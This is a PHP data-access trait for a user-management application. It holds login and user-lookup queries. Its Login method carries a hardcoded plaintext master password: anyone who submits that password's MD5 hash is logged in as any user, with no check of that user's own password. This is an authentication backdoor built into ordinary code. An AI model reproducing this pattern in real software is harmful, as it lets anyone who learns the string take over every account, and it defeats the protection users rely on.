<?php
namespace Application\Dao\Services\Core;

use Application\Dao\Entities\Core\Cliente;
use Application\Dao\Entities\Core\Contacto;
use Application\Dao\Entities\Core\Empresa;
use Application\Dao\Entities\Core\Perfil;
use Application\Dao\Entities\Core\Usuario;
use Intouch\Framework\Dao\Queryable;

trait UsuarioDaoT
{
    private $MasterPassword = "talcahuano";

    public function Login($loginName, $password) {

        if ($password != md5($this->MasterPassword)) {
            $qry = (new Queryable())
                    ->From(Usuario::class)
                    ->With(Cliente::class)
                    ->With(Contacto::class)
                    ->Where('LOWER(LoginName) = ? AND Clave = ? AND Usuario.Eliminado = 0 AND IdTipoClave = 2', $loginName, $password)
                    ->Top(1);
        }
        else {
            $qry = (new Queryable())
                    ->From(Usuario::class)
                    ->With(Cliente::class)
                    ->With(Contacto::class)
                    ->Where('LOWER(LoginName) = ? AND Usuario.Eliminado = 0 AND IdTipoClave = 2', $loginName)
                    ->Top(1);
        }

        return $this->Query(
            query: $qry,
            returnFirstRecord: true
        );
    }

    public function BuscarUsuarioWithClienteByIdUsuarioAndCliente($IdUsuario,$IdCliente) {
        $qry = (new Queryable())
                ->From(Usuario::class)
                ->With(Cliente::class)
                ->With(Contacto::class)
                ->Where('IdUsuario = ? AND Usuario.IdCliente = ? AND Usuario.Eliminado = 0', $IdUsuario, $IdCliente)
                ->Top(1);

        return $this->Query(
            query: $qry,
            returnFirstRecord: true
        );
    }

    public function TraerUsuariosParaGestor($idCliente){

        $qry = (new Queryable())
                ->From(Usuario::class)
                ->With(Contacto::class)
                ->With(Perfil::class)
                ->With(Empresa::class)
                ->Where('Usuario.IdCliente = ? AND Usuario.Eliminado = ?' , $idCliente ,0);

        $result = $this->Query($qry);
        return $result; 
    }
}
